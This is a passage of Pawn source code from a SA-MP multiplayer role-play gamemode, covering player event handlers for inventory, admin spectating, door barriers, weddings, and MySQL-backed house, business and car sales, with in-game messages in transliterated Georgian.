						ApplyAnimation(playerid,"CARRY","liftup",1.0,0,1,1,0,0,1);
						SetTimerEx("CarryDelay",1000,false,"i",playerid);
						SetPlayerAttachedObject(playerid,0,2358,6,0.0,0.10,-0.2, -110.0,0.0,78.0);
					}
					else SendClientMessage(playerid,CGRAY,"Shecdoma");
					return true;
				}
			}
		}
	}
	return true;
}

public OnPlayerLeaveDynamicArea(playerid, areaid)
{
	if(areaid >= gHouseArea[0] && areaid <= gHouseArea[gHouseCount])
	{
		pTemp[playerid][pSelectedHouseID] = 0;
	}
	else if(areaid >= gBusinessArea[0] && areaid <= gBusinessArea[gBusinessCount - 1])
	{
		if(GetPVarInt(playerid,"JustTP") == 0) pTemp[playerid][pSelectedBusinessID] = -1;
	}
	return true;
}

public OnPlayerRequestSpawn(playerid)
{
	if(GetPVarInt(playerid,"Logined") == 0) return false;
	return true;
}

public OnObjectMoved(objectid)
{
	return true;
}

public OnPlayerObjectMoved(playerid, objectid)
{
	return true;
}

public OnPlayerPickUpPickup(playerid, pickupid)
{
	return true;
}
public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
    for(new i; i < 16; i++)
    {
        if(playertextid == Inventory[i][playerid])
        {
            SetPVarInt(playerid,"SelectSlot",i);
            if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 0) { }
			else
			{
				new mess[200], pltest = GetPVarInt(playerid,"SelectSlot") - 1;
				format(mess,sizeof(mess),"{ffffff}Nivti: {"#cINFO"}%s{ffffff}\nRaodenoba: {"#cGREEN"}%d\n\n{bbbbbb} C.M.D Nivtis Gadasacemat Tqven Naxavt,\nDaweret/mm -> [1] -> Yvela C.M.D.",Items_All[InventoryPlayer[playerid][invSlot][pltest]][invName],InventoryPlayer[playerid][invKol][pltest]);
				ShowPlayerDialog(playerid,dInver,0,"{"#cGREEN"}Inventari: {ffffff}Informacia",mess,"Archeva","Daxurva");
			}
        }
    }
	return true;
}
public OnPlayerSelectedMenuRow(playerid, row)
{
    new Menu:Current = GetPlayerMenu(playerid);
	if(Current == specmenu)
 	{
 	    switch(row)
 	    {
 	        case 0:
		  	{
		 	    new mes2[60];
				format(mes2,sizeof(mes2),"/sp %d",pTemp[playerid][pSpectatee]);
				OnPlayerCommandText(playerid,mes2);
			}
			case 1:
			{
			    if(pData[playerid][pAdmin] < 3) return true;
			    new Float:Xq,Float:Yq,Float:Zq;
			    GetPlayerPos(pTemp[playerid][pSpectatee],Xq,Yq,Zq);
			    SetPlayerPos(pTemp[playerid][pSpectatee],Xq,Yq,Zq+5);
			    ShowMenuForPlayer(specmenu,playerid);
			}
			case 2:
		  	{
		 	    new mes2[60];
				format(mes2,sizeof(mes2),"/astats %d",pTemp[playerid][pSpectatee]);
				OnPlayerCommandText(playerid,mes2);
				ShowMenuForPlayer(specmenu,playerid);
			}
			case 3:
		  	{
		 	    new mes2[60];
				format(mes2,sizeof(mes2),"/weap %d",pTemp[playerid][pSpectatee]);
				OnPlayerCommandText(playerid,mes2);
				ShowMenuForPlayer(specmenu,playerid);
			}
			case 4:
		  	{
		 	    new mes2[60];
				format(mes2,sizeof(mes2),"/gmcheck %d",pTemp[playerid][pSpectatee]);
				OnPlayerCommandText(playerid,mes2);
				ShowMenuForPlayer(specmenu,playerid);
			}
			case 5:
		  	{
		 	    new spectatee = pTemp[playerid][pSpectatee];
				if(spectatee != INVALID_PLAYER_ID) pTemp[playerid][pSpectatee] = INVALID_PLAYER_ID;
				TogglePlayerSpectating(playerid,0);
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(playerid,0);
				SetCameraBehindPlayer(playerid);
				HideMenuForPlayer(specmenu,playerid);
			}
		}
	}
    return true;
}
public OnPlayerExitVehicle(playerid, vehicleid)
{
    ResetCarInfo(playerid);
	new id = GetPVarInt(playerid, "vehid");
	if(id > 0) {
		GetVehiclePos(id, gVehicles[id - 1][vX], gVehicles[id - 1][vY], gVehicles[id - 1][vZ]);
		GetVehicleZAngle(id, gVehicles[id - 1][vA]);
	}
    return true;
}
public OnVehicleMod(playerid, vehicleid, componentid)
{
	new vehicleide = GetVehicleModel(vehicleid);
    new modok = islegalcarmod(vehicleide, componentid);
    if (!modok && !IsKicked(playerid)) {
		SendClientMessage(playerid,CGRAY,"Tqven Miutitet Avtomobilis Komponentis Araswori ID");
		NewKick(playerid);
    }
	return true;
}

public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	return true;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
	return true;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	return true;
}
public OnPlayerExitedMenu(playerid)
{
    return true;
}
stock PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z)
{
    if(IsPlayerConnected(playerid))
    {
        new Float:oldposx, Float:oldposy, Float:oldposz; new Float:tempposx, Float:tempposy, Float:tempposz;
        GetPlayerPos(playerid, oldposx, oldposy, oldposz);
        tempposx = (oldposx -x); tempposy = (oldposy -y); tempposz = (oldposz -z);
        if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi))){ return true; }
    }
    return false;
}
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
    if(!IsPlayerConnected(playerid)) return true;
    if(GetPVarInt(playerid,"Logined") == 0) return Kick(playerid);
    //AntiCheat(playerid);
	if(pTemp[playerid][pCuffee] == playerid)
	{
		if(!IsPlayerInAnyVehicle(playerid))
		{
			if((newkeys & KEY_JUMP || newkeys & KEY_FIRE || newkeys & KEY_CROUCH || (newkeys & KEY_HANDBRAKE && newkeys & KEY_SECONDARY_ATTACK)))
			{
				ClearAnimations(playerid);
				SetTimerEx("Unfreez2",3000,false,"i",playerid);
				ApplyAnimation(playerid,"FAT","IDLE_tired",3.0,1,0,0,0,3000,1);
				TogglePlayerControllable(playerid,0);
				SendClientMessage(playerid,CGRAY,"Tqven Ver Imoqmedebt, Tqven Gadevt Borkilebi");
			}
		}
	}
	if(oldkeys & KEY_SPRINT && !IsPlayerInAnyVehicle(playerid))
	{
		if(newkeys & KEY_JUMP) CheckBunnyHop(playerid);
		else SetPVarInt(playerid, "PlayerJag", GetTickCount());
	}
	if(newkeys & KEY_JUMP && !IsPlayerInAnyVehicle(playerid))
	{
		if(GetTickCount() - GetPVarInt(playerid, "PlayerJag") < 250) CheckBunnyHop(playerid);
		SetPVarInt(playerid, "PlayerJag", 0);

		if((GetPVarInt(playerid,"Work") == 4 && GetPVarInt(playerid,"gunamount") == 2))
		{
			SendClientMessage(playerid,CGRAY,"Tqven Dagecat Rkinigza");
			SetPVarInt(playerid,"gunamount",0);
			SetPVarInt(playerid,"carrygun",0);
			RemovePlayerAttachedObject(playerid,0);
			RemovePlayerAttachedObject(playerid,1);
			ClearAnimations(playerid);
			SetPVarInt(playerid,"kida",2);
			SetPlayerCheckpoint(playerid,2154.7952,-1972.4408,13.6738,1.0);
		}
	}
	if(IsPlayerInAnyVehicle(playerid) && newkeys == 2)
	{
	    if(PlayerToPoint(5.0,playerid,1015.3531,-1438.2787,13.5469) || PlayerToPoint(5.0,playerid,2384.6409,1026.9692,10.8203) || PlayerToPoint(5.0,playerid,-1917.2198,295.4781,41.0469)) ShowSTODialog(playerid);
    }
	if(newkeys == KEY_SUBMISSION && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) ToggleEngine(GetPlayerVehicleID(playerid));
    if(newkeys & KEY_WALK)
    {
        if(PlayerToPoint(2.0,playerid,217.5816,-397.2651,1000.5192))
		{
		    if(!IsACop(playerid)) return true;
		    MoveDynamicObject(gBarrier[9], 217.1933594,-398.9214844,999.5189819, 2.0);
			SetTimerEx("CloseBarrier",5000,false,"i",14);
	    }
	    if(PlayerToPoint(2.0,playerid,131.6461,-214.2265,922.9600))
		{
		    if(pData[playerid][pFraction] != 2) return true;
		    MoveDynamicObject(gBarrier[10], 128.9180756,-213.8379974,921.9600220, 2.0);
			SetTimerEx("CloseBarrier",5000,false,"i",15);
	    }
    }
	if(newkeys & KEY_CROUCH)
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			if(PlayerToPoint(5.0,playerid,-1950.0366,-1014.1642,32.1443))
			{
			    if(!IsACop(playerid)) return true;
			    if(fbida == 1) return true;
			    MoveDynamicObject(gBarrier[8], -1952.6964111,-1015.1713867,31.3134995, 2.0);
				SetTimerEx("CloseBarrier",5000,false,"i",13);
				fbida = 1;
			}
		}
	}
	if(newkeys & KEY_YES)
	{
	    if(GetPVarInt(playerid,"Wed") == 2)
	    {
			format(mes, sizeof(mes), "Saqmro %s Da Sacole %s Warmatebit Daqorwindnen", Name2(WeddingTwo[playerid]), Name2(playerid));
			SendClientMessageToAll(0xcc33ffff, mes);
			new sendername[32],giveplayer[32];
			GetPlayerName(playerid, sendername,MAX_PLAYER_NAME);
			GetPlayerName(WeddingTwo[playerid], giveplayer,MAX_PLAYER_NAME);
			strmid(pData[playerid][pDivorce], giveplayer, 0, strlen(giveplayer), 32);
			strmid(pData[WeddingTwo[playerid]][pDivorce], sendername, 0, strlen(sendername), 32);
			new query[128];
		    format(query,sizeof(query),"UPDATE `accounts` SET divorce = '%s' WHERE nickname = '%s'",sendername,Name2(WeddingTwo[playerid]));
		    mysql_empty(mysql, query);
		    format(query,sizeof(query),"UPDATE `accounts` SET divorce = '%s' WHERE nickname = '%s'",giveplayer,Name2(playerid));
		    mysql_empty(mysql, query);
		    WeddingTwo[playerid] = -1;
			SetPVarInt(playerid,"Wed",0);
	    }
	    if(IsPlayerInRangeOfPoint(playerid, 2.0, 304.6951,307.3586,999.1484)) ShowPlayerDialog(playerid, dSborka, 2, "{ffcc00}Laboratoria", "{"#cWHITE"}1. Sheqmeni Preparati {"#cYELLOW"}Fiberius\n{"#cWHITE"}2. Sheqmeni Preparati {"#cYELLOW"}Flara\n{"#cWHITE"}3. Informacia Preparatze", "Archeva", "Daxurva");
	    if(IsPlayerInRangeOfPoint(playerid, 2.0, 1384.5718,-25.8539,1000.9229))
	    {
	        ShowPlayerDialog(playerid,dGrain,0,"Narkotikebis Sheqmna","{"#cBLUE"}Narkotikebis Damzadeba:\n\n{"#cWHITE"}1 Narkotiki = 10 Marcvalis\n\n{"#cYELLOW"}Tanaxma Xart?","YES","NO");
	    }
	    if(IsPlayerInRangeOfPoint(playerid, 2.0, 1387.5725,-25.3795,1000.9229)) ShowPlayerDialog(playerid, dPodval, 2, "{ffcc00}Sardapi", "1. Aige Iaragi\n2. Daamzade Xelnaketi Bombi", "Archeva", "Daxurva");
        if(GetPVarInt(playerid,"21ShowDiplact") == playerid)
        {
            new id = GetPVarInt(playerid,"21ShowDiplpl"), id1 = GetPVarInt(playerid,"321ShowDiplact");
            format(mes,sizeof(mes),"Misca Meore Tansacmeli %s",Name2(playerid));
			MeAction(id,mes);
			SetPlayerSkin(playerid,id1);
   			pData[playerid][pSkin] = id1;
   			UpdatePlayerData(playerid,"skin",pData[playerid][pSkin]);
   			if(GetPVarInt(id,"iderid") == 1)
   			{
   			    if(pData[id][pSex] == 2) pData[id][pSkin] = 90;
				else pData[id][pSkin] = 252;
	   			UpdatePlayerData(id,"skin",pData[id][pSkin]);
	   			SetPlayerSkin(id,pData[id][pSkin]);

	   			new houseid = pData[id][pHouse]-1;
	   			if(!pData[id][pHouse] || !gHouses[houseid][houseImprove][1] || ((houseid+1) > 0 && !GetString(Name2(id),gHouses[houseid][houseOwner]))) {}
	   			else
	   			{
	   			    new slot=-1;
	   			    for(new i;i<3;i++)
	   			    {
	   			        if(GetPlayerSkin(id) == gHouses[houseid][houseSkin][i]) return SendClientMessage(id,CGRAY,"Tqven Ukve Gaqvt Es Tansacmeli Kamodshi.");
						if(!gHouses[houseid][houseSkin][i]) {slot = i; break;}
	   			    }
	   			    gHouses[houseid][houseSkin][slot] = GetPlayerSkin(id);
					UpdateHouseDress(houseid);
	   			}
   			}
   			else if(GetPVarInt(id,"iderid") == 2)
   			{
   			    if(pData[id][pSex] == 2) pData[id][pFractionSkin] = 90;
				else pData[id][pFractionSkin] = 252;
	   			UpdatePlayerData(id,"fractionskin",pData[id][pFractionSkin]);
	   			SetPlayerSkin(id,pData[id][pFractionSkin]);
   			}
   			new houseid = pData[playerid][pHouse]-1;
   			if(!pData[playerid][pHouse] || !gHouses[houseid][houseImprove][1] || ((houseid+1) > 0 && !GetString(Name2(playerid),gHouses[houseid][houseOwner]))) {}
   			else
   			{
   			    new slot=-1;
   			    for(new i;i<3;i++)
   			    {
   			        if(GetPlayerSkin(playerid) == gHouses[houseid][houseSkin][i]) return SendClientMessage(id,CGRAY,"Tqven Ukve Gaqvt Es Tansacmeli Kamodshi.");
					if(!gHouses[houseid][houseSkin][i]) {slot = i; break;}
   			    }
   			    gHouses[houseid][houseSkin][slot] = GetPlayerSkin(playerid);
				UpdateHouseDress(houseid);
			}

            SetPVarInt(playerid,"21ShowDiplpl",-1);
		 	SetPVarInt(playerid,"21ShowDiplact",-1);
        }
		if(GetPVarInt(playerid,"1ShowDiplact") == playerid)
        {
            new id = GetPVarInt(playerid,"1ShowDiplpl");
            ShowSkills(playerid, id);
			format(mes,sizeof(mes),"Achvena Tiris Amonaweri %s",Name2(playerid));
			MeAction(id,mes);
            SetPVarInt(playerid,"1ShowDiplpl",-1);
		 	SetPVarInt(playerid,"1ShowDiplact",-1);
        }
	    if(GetPVarInt(playerid,"ShowDiplact") == playerid)
        {
            new id = GetPVarInt(playerid,"ShowDiplpl");
            new mes2[256];
            format(mes2,sizeof(mes2),"{"#cBLUE"}             Ganatleba:\n{"#cWHITE"}Iuridiuli:   Done {"#cYELLOW"}%d%%\n{"#cWHITE"}Medicinis:   Done {"#cYELLOW"}%d%%\n{"#cWHITE"}Jurnalistikuri:   Done {"#cYELLOW"}%d%%",pData[id][pObraz1],pData[id][pObraz3],pData[id][pObraz4]);
            ShowPlayerDialog(playerid,dMes,0,"        Ganatleba        ",mes2,"OK","");
			format(mes,sizeof(mes),"Achvena Diplomi %s",Name2(playerid));
			MeAction(id,mes);
            SetPVarInt(playerid,"ShowDiplpl",-1);
		 	SetPVarInt(playerid,"ShowDiplact",-1);
        }
	    if(pTemp[playerid][pShowPassact] == playerid)
	    {
	        new acter = pTemp[playerid][pShowPasspl];
            ShowPass(acter,playerid);
			format(mes,sizeof(mes),"Aigo Pasorti Da Achvena: %s",Name2(playerid));
			MeAction(acter,mes);
			pTemp[playerid][pShowPassact] = -1;
	    }
	    if(pTemp[playerid][pShowLicact] == playerid)
	    {
	        new mes2[350];
	        new acter = pTemp[playerid][pShowLicpl];
			strcat(mes2,"{"#cWHITE"}Martvis Mowmoba: ");
			if(pData[acter][pLicenses][LIC_DRIVING]) strcat(mes2,"{739F95}Ki\n");
			else strcat(mes2,"{"#cRED"}Ara\n");
			strcat(mes2,"{"#cWHITE"}Pilotis Licenzia: ");
			if(pData[acter][pLicenses][LIC_FLY]) strcat(mes2,"{739F95}Ki\n");
			else strcat(mes2,"{"#cRED"}Ara\n");
			strcat(mes2,"{"#cWHITE"}Wylis Transportis Licenzia: ");
			if(pData[acter][pLicenses][LIC_BOAT]) strcat(mes2,"{739F95}Ki\n");
			else strcat(mes2,"{"#cRED"}Ara\n");
			strcat(mes2,"{"#cWHITE"}Iaragis Licenzia: ");
			if(pData[acter][pLicenses][LIC_WEAP]) strcat(mes2,"{739F95}Ki\n");
			else strcat(mes2,"{"#cRED"}Ara\n");
			ShowPlayerDialog(playerid,dMes,0,"Tqveni Licenziebi",mes2,"OK","");
			format(mes,sizeof(mes),"Achvena Licenzia %s",Name2(playerid));
			MeAction(acter,mes);
			pTemp[playerid][pShowLicact] = -1;
	    }
		if(pTemp[playerid][pSellHouseOffee] == playerid) //Согласился купить дом
		{
			new houseid = pTemp[playerid][pSellHouseID];
			new price = pTemp[playerid][pSellHousePrice];
			new offerid = pTemp[playerid][pSellHouseOffer];
			if(!gHouses[houseid][houseOwner] || !pData[offerid][pHouse])
			{
				SendClientMessage(playerid,CGRAY,"Saxli Gakida Mtavrobam.");
				pTemp[offerid][pSellHouseOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellHouseOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellHouseOffee] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellHousePrice] = 0;
				pTemp[playerid][pSellHouseID] = 0;
				return true;
			}
			if(pTemp[offerid][pSellHouseOffer] == INVALID_PLAYER_ID || !IsPlayerConnected(offerid))
			{
				SendClientMessage(playerid,CGRAY,"Gamyidveli Gavida Tamashidan, An Saxli Gaiyida Sxva Motamasheze");
				pTemp[offerid][pSellHouseOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellHouseOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellHouseOffee] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellHousePrice] = 0;
				pTemp[playerid][pSellHouseID] = 0;
				return true;
			}
			if(GetPlayerMoneyEx(playerid) < price)
			{
				SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa Xelze.");
				SendClientMessage(offerid,CGRAY,"Myidvels Ar Aqvs Sakmarisi Tanxa.");
				pTemp[offerid][pSellHouseOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellHouseOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellHouseOffee] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellHousePrice] = 0;
				pTemp[playerid][pSellHouseID] = 0;
				return true;
			}
			UpdatePlayerData(offerid,"house",0);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL 1");
			UpdatePlayerData(playerid,"house",houseid+1);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL 2");
			new query[256];
			format(query,sizeof(query),"UPDATE `houses` SET `ownerid` = '%d', owner = '%s',inhabit2id = '0',inhabit3id = '0',inhabit4id = '0',inhabit2='',inhabit3='',inhabit4='' WHERE `id` = '%d'",pData[playerid][pMysqlID],Name2(playerid),houseid+1);
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL 3");
			TransferMoney(playerid,offerid,price);
			pData[playerid][pHouse] = houseid+1;
			pData[offerid][pHouse] = 0;
			gHouses[houseid][houseOwnerID] = pData[playerid][pMysqlID];
			format(gHouses[houseid][houseOwner],MAX_PLAYER_NAME,"%s",Name2(playerid));
			strdel(gHouseHabits[houseid][0],0,24);
			strdel(gHouseHabits[houseid][1],0,24);
			strdel(gHouseHabits[houseid][2],0,24);
			gHouses[houseid][houseHabitID][0] = 0;
			gHouses[houseid][houseHabitID][1] = 0;
			gHouses[houseid][houseHabitID][2] = 0;
			if(gHouses[houseid][houseImprove][1])
			{
				gHouses[houseid][houseSkin][0] = pData[playerid][pSkin];
				SendClientMessage(playerid,CGREEN,"Tqven Tansacmeli Motavsda Karadashi. Iyidet Saxli.");
			}
			gHouses[houseid][houseSkin][1] = 0;
			gHouses[houseid][houseSkin][2] = 0;
			gHouses[houseid][houseSkin][3] = 0;
			if(pData[playerid][pFraction]) gHouses[houseid][houseSkin][3] = pData[playerid][pFractionSkin];
			UpdateHouseDress(houseid);
			if(pData[offerid][pFraction]) SetPlayerSkin(offerid,pData[offerid][pFractionSkin]);
			SendClientMessage(playerid,CGREEN,"Gilocavt, Tqven Sheidzinet Saxli.");
			SendClientMessage(offerid,CGREEN,"Saxli Gaiyida.");
			pTemp[offerid][pSellHouseOffer] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellHouseOffer] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellHouseOffee] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellHousePrice] = 0;
			pTemp[playerid][pSellHouseID] = 0;

		}
		if(pTemp[playerid][pSellBusinessOffee] == playerid) //Согласился купить бизнес
		{
			new businessid = pTemp[playerid][pSellBusinessID]-1;
			new price = pTemp[playerid][pSellBusinessPrice];
			new offerid = pTemp[playerid][pSellBusinessOffer];
			if(!gBusiness[businessid][busiOwnerID] || !pData[offerid][pBusiness])
			{
				SendClientMessage(playerid,CGRAY,"Biznesi Gadavida Saxelmwifo Sakutrebashi.");
				pTemp[offerid][pSellBusinessOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellBusinessOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellBusinessOffee] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellBusinessPrice] = 0;
				pTemp[playerid][pSellBusinessID] = 0;
				return true;
			}
			if(pTemp[offerid][pSellBusinessOffer] == INVALID_PLAYER_ID || !IsPlayerConnected(offerid))
			{
				SendClientMessage(playerid,CGRAY,"Gamyidveli Gavida Tamashidan, An Biznesi Gaiyida Sxva Motamasheze.");
				pTemp[offerid][pSellBusinessOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellBusinessOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellBusinessOffee] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellBusinessPrice] = 0;
				pTemp[playerid][pSellBusinessID] = 0;
				return true;
			}
			if(GetPlayerMoneyEx(playerid) < price)
			{
				SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa Xelze.");
				SendClientMessage(offerid,CGRAY,"Myidvels Ar Aqvs Sakmarisi Tanxa.");
				pTemp[offerid][pSellBusinessOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellBusinessOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellBusinessOffee] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellBusinessPrice] = 0;
				pTemp[playerid][pSellBusinessID] = 0;
				return true;
			}
			UpdatePlayerData(offerid,"bussiness",0);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL 1");
			UpdatePlayerData(playerid,"bussiness",businessid+1);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL 2");
			new query[256];
			format(query,sizeof(query),"UPDATE `business` SET `ownerid` = '%d', `owner` = '%s' WHERE `id` = '%d'",pData[playerid][pMysqlID],Name2(playerid),businessid+1);
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL 3");
			TransferMoney(playerid,offerid,price);
			pData[playerid][pBusiness] = businessid;
			pData[offerid][pBusiness] = 0;
			gBusiness[businessid][busiOwnerID] = pData[playerid][pMysqlID];
			SetString(gBusiness[businessid][busiOwner],Name2(playerid));
			UpdateBusinessText(businessid);
			SendClientMessage(playerid,CGREEN,"Gilocavt, Tqven Iyidet Biznesi");
			SendClientMessage(offerid,CGREEN,"Biznesi Gaiyida");
			PlayerPlaySound(playerid,1185,0.0,0.0,0.0);
			SetTimerEx("PlayerPlaySoundDelay",6900,false,"ii",playerid,1186);
			pTemp[offerid][pSellBusinessOffer] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellBusinessOffer] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellBusinessOffee] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellBusinessPrice] = 0;
			pTemp[playerid][pSellBusinessID] = 0;

		}
		if(pTemp[playerid][pSettleHouseOffee] == playerid)
		{
			new houseid = pTemp[playerid][pSettleHouseID];
			new offerid = pTemp[playerid][pSettleHouseOffer];
			if(pTemp[offerid][pSettleHouseOffer] == INVALID_PLAYER_ID || !IsPlayerConnected(offerid))
			{
				SendClientMessage(playerid,CGRAY,"Is Vinc Shemogtavaza Axali Saxli, Gavida Tamashidan");
				pTemp[offerid][pSettleHouseOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSettleHouseOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSettleHouseOffee] = INVALID_PLAYER_ID;
				pTemp[playerid][pSettleHouseID] = 0;
				return true;
			}
			new slot=-1;
			for(new i;i<gHouses[houseid][houseClass];i++)
			{
				if(!gHouses[houseid][houseHabitID][i]) {slot = i; break;}
			}
			if(slot == -1)
			{
				SendClientMessage(playerid,CGRAY,"Saxlshi Ar Aris Adgili");
				SendClientMessage(offerid,CGRAY,"Saxlshi Ar Aris Adgili");
				pTemp[offerid][pSettleHouseOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSettleHouseOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSettleHouseOffee] = INVALID_PLAYER_ID;
				pTemp[playerid][pSettleHouseID] = 0;
			}
			UpdatePlayerData(playerid,"house",houseid+1);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Dafiqsirda Shecdoma mysql");
			new query[128];
			format(query,sizeof(query),"UPDATE `houses` SET `inhabit%did`='%d', `inhabit%d`='%s' WHERE `id`='%d'",slot+2,pData[playerid][pMysqlID],slot+2,Name2(playerid),houseid+1);
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Dafiqsirda Shecdoma mysql");
			SFCM(playerid,CINFO,"Tqven Gaxdit Mdgmuri Saxlshi {"#cWHITE"}%s",Name2(offerid));
			SFCM(offerid,CINFO,"Tqven Miiget {"#cWHITE"}%s {"#cINFO"}Mdgmuri Tqven Saxlshi",Name2(playerid));
			pData[playerid][pHouse] = houseid+1;
			gHouses[houseid][houseHabitID][slot] = pData[playerid][pMysqlID];
			format(gHouseHabits[houseid][slot],MAX_PLAYER_NAME,"%s",Name2(playerid));
			pTemp[offerid][pSettleHouseOffer] = INVALID_PLAYER_ID;
			pTemp[playerid][pSettleHouseOffer] = INVALID_PLAYER_ID;
			pTemp[playerid][pSettleHouseOffee] = INVALID_PLAYER_ID;
			pTemp[playerid][pSettleHouseID] = 0;
		}
		if(pTemp[playerid][pSellCarOffee] == playerid)
		{
			new offerid = pTemp[playerid][pSellCarOffer];
			new price = pTemp[playerid][pSellCarPrice];
			if(!pData[playerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Saxli");
			new houseid = pData[playerid][pHouse]-1;
			if(!pData[offerid][pCar])
			{
				SendClientMessage(playerid,CGRAY,"Manqana Gagiyidat Saxelmwifom");
				pTemp[offerid][pSellCarOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellCarOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellCarOffee] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellCarPrice] = 0;
				pTemp[playerid][pSellCarID] = 0;
				return true;
			}
			if(pTemp[offerid][pSellCarOffer] == INVALID_PLAYER_ID || !IsPlayerConnected(offerid))
			{
				SendClientMessage(playerid,CGRAY,"Gamyidveli, Gavida Tamashidan");
				pTemp[offerid][pSellCarOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellCarOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellCarOffee] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellCarPrice] = 0;
				pTemp[playerid][pSellCarID] = 0;
				return true;
			}
			if(GetPlayerMoneyEx(playerid) < price)
			{
				SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa Xelze.");
				SendClientMessage(offerid,CGRAY,"Myidvels Ar Aqvs Sakmarisi Tanxa.");
				pTemp[offerid][pSellCarOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellCarOffer] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellCarOffee] = INVALID_PLAYER_ID;
				pTemp[playerid][pSellCarPrice] = 0;
				pTemp[playerid][pSellCarID] = 0;
				return true;
			}
			pData[playerid][pCarID] = pData[offerid][pCarID];
			pData[playerid][pCar] = pData[offerid][pCar];
			pData[playerid][pFuel] = pData[offerid][pFuel];
			pData[playerid][pLimit] = pData[offerid][pLimit];
			UpdatePlayerData(playerid,"car",pData[offerid][pCar]);
			UpdatePlayerData(playerid,"carid",pData[offerid][pCarID]);
			UpdatePlayerData(playerid,"limit",pData[offerid][pLimit]);
			pData[offerid][pCar] = 0;
			pData[offerid][pFuel] = 0;
			pData[offerid][pLimit] = 0;
			UpdatePlayerData(offerid,"car",0);
			UpdatePlayerData(offerid,"fuel",0);
			UpdatePlayerData(offerid,"limit",0);
			SendClientMessage(playerid,CGREEN,"Gilocavt, Tqven Sheidzinet Avtomobili");
			SendClientMessage(offerid,CGREEN,"Avtomobili Gaiyida");
			TransferMoney(playerid,offerid,price);
			DestroyVehicle(gVehicles[pData[offerid][pHouse]][vvID]);
			gVehicles[pData[offerid][pHouse]][vvID] = -1;
			new vehicleid = CreateVehicle(gTransport[pData[playerid][pCar]-400][trModel],gHouses[houseid][houseParkX],gHouses[houseid][houseParkY],gHouses[houseid][houseParkZ],gHouses[houseid][houseParkR],pData[playerid][pColor1],pData[playerid][pColor2],-1);
            gVehicles[pData[playerid][pHouse]][vvID] = vehicleid;
            gVehicles[pData[playerid][pHouse]][vProbability] = pData[playerid][pLimit];
            gVehicles[pData[playerid][pHouse]][vProbability2] = 1;
			SetVehicleHealthEx(gVehicles[pData[playerid][pHouse]][vvID],1000);
			ToggleLock(gVehicles[pData[playerid][pHouse]][vvID]);

			pTemp[offerid][pSellCarOffer] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellCarOffer] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellCarOffee] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellCarPrice] = 0;
			pTemp[playerid][pSellCarID] = 0;
		}
		if(GetPVarInt(playerid,"repairoffee") == playerid && GetPVarInt(playerid,"repairoffer") != playerid)
		{
			new offer = GetPVarInt(playerid,"repairoffer");
			new price = GetPVarInt(playerid,"repairprice");
			if(GetPVarInt(offer,"repairoffee") == playerid)
			{
				SetPVarInt(playerid,"repairoffee",-1);
				SetPVarInt(playerid,"repairoffer",-1);
